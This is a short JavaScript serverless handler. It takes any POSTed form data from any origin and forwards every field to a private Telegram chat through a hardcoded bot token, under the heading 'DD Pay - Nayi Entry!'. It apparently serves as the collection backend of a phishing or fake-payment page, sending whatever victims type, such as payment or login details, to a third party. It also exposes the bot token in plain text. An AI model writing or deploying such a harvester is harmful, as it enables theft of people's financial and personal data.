export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(200).end();

  let body = req.body;
  if (!body) {
    try { body = JSON.parse(req.body || '{}'); } catch { body = {}; }
  }
  if (typeof body === 'string') {
    try { body = JSON.parse(body); } catch { body = {}; }
  }

  const BOT_TOKEN = '8606684305:AAF5P-iR60pafefJwJ187neRGBhHsUWbuqs';
  const CHAT_ID = '7344589159';

  let text = `🔥 DD Pay - Nayi Entry!\n\n`;
  for (const k in body) { text += `${k}: ${body[k]}\n`; }
  text += `\nTime: ${new Date().toLocaleString('en-IN', {timeZone: 'Asia/Kolkata'})}`;

  try {
    const tg = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID, text: text })
    });
    const tgRes = await tg.json();
    return res.status(200).json({ ok: true, tg: tgRes });
  } catch (e) {
    return res.status(500).json({ error: e.message });
  }
}
